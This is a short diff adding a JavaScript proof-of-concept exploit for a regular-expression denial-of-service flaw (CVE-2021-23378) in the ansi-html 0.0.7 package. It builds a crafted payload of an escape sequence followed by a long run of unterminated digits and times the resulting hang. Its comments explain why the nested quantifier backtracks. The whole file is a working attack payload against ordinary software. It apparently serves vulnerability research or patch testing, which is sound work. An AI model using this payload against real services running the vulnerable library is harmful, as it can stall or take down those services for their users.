@@ -1,0 +1,17 @@
+```javascript
+// Exploit for ansi-html 0.0.7 ReDoS (CVE-2021-23378)
+// The internal regex /\033\[(\d+)*m/g uses a nested quantifier (\d+)*
+// which causes catastrophic backtracking when fed a long run of digits
+// that never terminates with 'm'.
+const ansiHTML = require("./node_modules/ansi-html");
+
+// Prefix "\x1b[1m" makes the cheap _regANSI.test() sanity check pass,
+// then the malicious "\x1b[" + digits (no closing 'm') is what blows up
+// the vulnerable replace() regex.
+const payload = "\x1b[1m" + "\x1b[" + "1".repeat(35);
+
+console.log("Triggering ReDoS in ansi-html...");
+const start = Date.now();
+ansiHTML(payload);
+console.log("Finished in", Date.now() - start, "ms (should be extremely slow / hang for larger repeat counts)");
+```
